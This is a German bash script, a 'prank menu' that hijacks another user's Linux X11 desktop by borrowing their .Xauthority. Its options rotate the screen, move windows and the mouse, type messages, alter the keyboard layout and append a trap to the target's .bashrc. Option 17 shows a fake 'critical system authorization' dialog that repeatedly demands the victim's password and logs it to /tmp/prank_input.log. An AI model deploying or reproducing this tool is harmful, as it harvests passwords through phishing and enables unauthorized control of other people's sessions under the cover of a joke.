#!/bin/bash

# SuperPrank-Menü für Linux Mint/Cinnamon (X11)
# Nur Spaß – keine bleibenden Schäden 😇

clear
echo -n "Gib den Benutzernamen ein, den du ärgern willst: "
read -r TARGET_USER
USER_HOME="/home/$TARGET_USER"
export DISPLAY=:0
export XAUTHORITY="$USER_HOME/.Xauthority"

function stop_all() {
  killall xdotool unclutter zenity kdialog mpv notify-osd 2>/dev/null
  setxkbmap us
  xrandr --output eDP-1 --rotate normal --brightness 1
  gsettings reset-recursively org.cinnamon.desktop.background 2>/dev/null
  sed -i '/trap.*DEBUG/d' "$USER_HOME/.bashrc"
  rm -f /tmp/prank_input.log
  echo "Alle Streiche gestoppt und Rückgängig gemacht."
  exit
}

function show_dramatic_prompt() {
  nohup bash -c '
    RESPONSE=""
    while [[ -z "$RESPONSE" ]]; do
      RESPONSE=$(zenity --entry \
        --title="⚠ Kritische Systemautorisierung erforderlich" \
        --text="Zur Fortsetzung des Sicherheitsprozesses geben Sie bitte Ihr Passwort ein:" \
        --width=400 \
        --height=200)
    done
    echo "Eingabe von $TARGET_USER: $RESPONSE" >> /tmp/prank_input.log
  ' &
}

function prank_menu() {
  clear
  echo "🔧 Linux SSH Streich-Menü"
  echo "----------------------------------"
  echo " 1) Bildschirm drehen"
  echo " 2) Maus zappeln lassen"
  echo " 3) Nachricht schreiben lassen"
  echo " 4) Fenster springen lassen"
  echo " 5) Systemmeldung anzeigen"
  echo " 6) Terminal-Beep bei jedem Befehl"
  echo " 7) Fenster verschwinden"
  echo " 8) Bildschirmhelligkeit runter"
  echo " 9) Caps Lock toggeln"
  echo "10) Mauszeiger verschwinden lassen"
  echo "11) Layout auf Dvorak ändern"
  echo "12) Fake-Update anzeigen"
  echo "13) Rickroll abspielen"
  echo "14) Fenster tanzen lassen"
  echo "15) Screenshot als Hintergrund"
  echo "16) Text langsam eintippen"
  echo "17) Eingabedialog erzwingen"
  echo "99) Alles stoppen und rückgängig machen"
  echo " q) Beenden"
  echo -n "> Auswahl: "
  read -r opt
  case $opt in
    1) xrandr --output eDP-1 --rotate inverted;;
    2) nohup bash -c 'while true; do xdotool mousemove_relative 5 5; sleep 0.3; done' &;;
    3) xdotool type "Ich sehe, was du tust... 👀";;
    4) nohup bash -c 'while true; do wid=$(xdotool getwindowfocus); xdotool windowmove $wid $((RANDOM % 500)) $((RANDOM % 500)); sleep 1; done' &;;
    5) zenity --info --title="🚨 Achtung!" --text="Unbekannter Prozess entdeckt...";;
    6) echo 'trap "echo -ne \a" DEBUG' >> "$USER_HOME/.bashrc";;
    7) xdotool getactivewindow windowminimize;;
    8) xrandr --output eDP-1 --brightness 0.1;;
    9) nohup bash -c 'while true; do xdotool key Caps_Lock; sleep 3; done' &;;
   10) nohup unclutter -idle 0 &;;
   11) setxkbmap dvorak;;
   12) nohup zenity --info --title="Systemupdate" --text="Systemupdate läuft. Bitte warten..." &;;
   13) nohup mpv https://www.youtube.com/watch?v=dQw4w9WgXcQ > /dev/null 2>&1 &;;
   14) nohup bash -c 'while true; do for id in $(xdotool search --onlyvisible --class .); do xdotool windowmove "$id" $((RANDOM % 600)) $((RANDOM % 400)); done; sleep 0.5; done' &;;
   15) import -window root /tmp/prankshot.png && gsettings set org.cinnamon.desktop.background picture-uri "file:///tmp/prankshot.png";;
   16) xdotool type --delay 200 "Ich bin dein Linux-Geist...";;
   17) show_dramatic_prompt;;
   99) stop_all;;
    q) exit;;
    *) echo "Ungültige Eingabe";;
  esac
  echo "\n[Drücke Enter für Menü]"
  read
  prank_menu
}

# Menü starten
prank_menu
